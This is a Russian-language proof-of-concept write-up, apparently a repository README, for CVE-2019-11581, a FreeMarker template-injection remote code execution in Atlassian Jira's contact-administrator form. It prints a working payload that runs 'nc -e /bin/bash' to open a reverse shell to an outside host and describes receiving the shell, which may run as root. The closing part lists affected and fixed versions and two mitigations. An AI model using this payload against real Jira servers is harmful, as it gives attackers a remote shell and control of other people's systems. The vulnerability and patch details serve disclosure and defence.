# RCE-in-Jira
Remote code execution in Atlassian Jira(CVE-2019–11581) through template engine FreeMaker.

В апреле месяце была обнаружена RCE в продукте Atlassian Confluence, а если быть точнее в плагине, который почти всегда там используется. И вот через 4 месяца еще одна RCE, но теперь уже в другом продукте - Jira.

# PoC?
Все это дело реализовывается через форму "Связаться с админом". По умолчанию он выключен, но у многих он включен.
Jira использует компилирующий обработчик шаблонов - [FreeMaker](https://ru.wikipedia.org/wiki/FreeMarker), написанный на Java.
Зная это, получается сгенерировать несложный Payload.

```$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('nc -e /bin/bash r0hack.xyz 80').waitFor()```

![Image](https://downloader.disk.yandex.ru/preview/8aa9e1a7214395199fa69ba66aed75beb64bf6ba00d0b72d690a9bd8018afb8a/5d2e2aea/4FcDW08Vat-NVoVf6aWDVnDD_gIthqJIYIA_7RnszcLyB_bZTnYKFluDNTr71ayqNZ0SsUQajOnt62LXVqNhuw%3D%3D?uid=0&filename=rceinjira1.png&disposition=inline&hash=&limit=0&content_type=image%2Fpng&owner_uid=0&tknv=v2&size=2048x2048)

Затем идем к нам на сервер, где слушаем порт и видим, что есть бэкконект:

![Image](https://downloader.disk.yandex.ru/preview/8d6e8bae7389cf4566b64988bbaaef985c6465133571d05499258b931ebfbb33/5d2e2961/b0nHrU1uF4yBjMOSELFi-ihQsFlZA_Hm_FzlHi0zn0-fI8WEmKr8MSC9q54NCRe5jZ15c8XYUpkIlGu7dtrEWA%3D%3D?uid=0&filename=rceinjira2.png&disposition=inline&hash=&limit=0&content_type=image%2Fpng&owner_uid=0&tknv=v2&size=2048x2048)

Вуаля, у нас есть шелл. Чаще всего, это пользователь Jira, но есть также моменты, у кого запущен и от root.
Подобный RCE, еще был в 2017 году в Spring Boot и снова Java и снова шаблонизатор FreeMaker, [подробнее!](http://deadpool.sh/2017/RCE-Springs/)

![Image](http://deadpool.sh/images/rce_new.jpg)


# How To Fix?

Обновить!

Уязвимые версии:
* 4.4.x
* 5.x.x
* 6.x.x
* 7.0.x
* 7.1.x
* 7.2.x
* 7.3.x
* 7.4.x
* 7.5.x
* 7.6.x before 7.6.14 (the fixed version for 7.6.x)
* 7.7.x
* 7.8.x
* 7.9.x
* 7.10.x
* 7.11.x
* 7.12.x
* 7.13.x before 7.13.5 (the fixed version for 7.13.x)
* 8.0.x before 8.0.3 (the fixed version for 8.0.x)
* 8.1.x before 8.1.2 (the fixed version for 8.1.x)
* 8.2.x before 8.2.3 (the fixed version for 8.2.x)

 
Исправлено в версиях:
* 7.6.14
* 7.13.5
* 8.0.3
* 8.1.2
* 8.2.3

Если нет возможности срочно обновится, то временным решением будет:
* Отключить форму отправки сообщения Админам
* Заблокировать доступ к эндпоинту ```/secure/admin/SendBulkMail!default.jspa```

```Всем удачи!```
